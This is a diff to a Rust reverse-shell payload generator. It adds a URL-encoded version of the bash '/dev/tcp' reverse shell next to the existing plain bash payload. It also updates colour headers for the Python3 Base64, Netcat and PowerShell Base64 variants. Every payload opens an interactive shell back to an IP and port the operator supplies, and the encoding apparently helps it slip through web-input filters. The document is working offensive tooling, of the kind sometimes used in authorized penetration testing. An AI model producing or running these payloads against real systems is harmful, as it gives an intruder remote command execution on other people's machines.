@@ -78,6 +78,11 @@ fn generate_bash(ip: &str, port: u16) {
     let payload = format!("bash -i >& /dev/tcp/{}/{} 0>&1", ip, port);
         println!("{}", payload);
         println!();
+
+    print_header("Bash URLEncoded");
+    let url_payload = format!("%2Fbin%2Fbash%20%2Dc%20%22%2Fbin%2Fbash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261%22", ip, port);
+        println!("{}", url_payload);
+        println!();
 }
 
 fn generate_python(ip: &str, port: u16) {
@@ -137,7 +142,7 @@ fn generate_powershell(ip: &str, port: u16) {
 
 fn print_header(lang: &str) {
     let colored = match lang {
-        "Bash" => lang.green().bold(),
+        "Bash" | "Bash URLEncoded" => lang.green().bold(),
         "Python3" | "Python3 Base64" => lang.blue().bold(),
         "Netcat (Traditional)" | "Netcat (OpenBSD/No -e flag)" => lang.magenta().bold(),
         "PowerShell" | "PowerShell Base64" => lang.red().bold(),
